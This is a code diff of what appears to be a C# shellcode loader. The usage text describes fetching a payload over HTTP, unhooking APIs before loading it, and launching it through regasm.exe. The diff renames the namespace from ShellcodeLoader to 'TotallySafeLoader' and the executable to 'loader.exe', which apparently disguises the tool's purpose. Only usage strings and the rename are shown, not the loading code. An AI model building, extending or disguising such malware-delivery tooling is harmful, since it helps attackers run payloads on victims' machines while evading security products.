@@ -9,7 +9,7 @@ using DI = XYZ.DI;
 using System.EnterpriseServices;
 using System.Net;
 
-namespace ShellcodeLoader
+namespace TotallySafeLoader
 {
     public class RegLoader : ServicedComponent
     {
@@ -236,7 +236,7 @@ namespace ShellcodeLoader
         private static void usage()
         {
             StringBuilder sb = new StringBuilder();
-            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [--http server[:port]] [shellcode_file] [-- shellcode_param1 [shellcode_param2...]]");
+            sb.AppendLine("Usage: loader.exe [--no-unhook] [-p password] [--http server[:port]] [shellcode_file] [-- shellcode_param1 [shellcode_param2...]]");
             sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
             sb.AppendLine("\t--http server[:port]\tdownload the payload file from the server instead of searching it locally. Default port: 8080");
             sb.AppendLine("\t--\tEverything after \"--\" is passed to the shellcode as CLI arguments.");
@@ -244,7 +244,7 @@ namespace ShellcodeLoader
             sb.AppendLine("\t-p password\t[TEMPORARILY DISABLED] if a password is required for the key, it will be read from this parameter instead of asking interactively");
             sb.AppendLine("\t--no-unhook\tDON'T UNHOOK API before loading the shellcode");
             sb.AppendLine("\nREGASM Mode:");
-            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [+--no-unhook] [+--http=connection_string] [+--file=shellcode_file]  [+-- shellcode_param1 [shellcode_param2...]]");
+            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U loader.exe [+--no-unhook] [+--http=connection_string] [+--file=shellcode_file]  [+-- shellcode_param1 [shellcode_param2...]]");
             sb.AppendLine("\nNOTE: Due to regasm complaining about wrong parameters, EVERY argument starting with a '-' MUST be prefixed with a '+', this also applies to shellcode params.(the '+' will be automatically removed during paring).");
             Console.WriteLine(sb.ToString());
         }
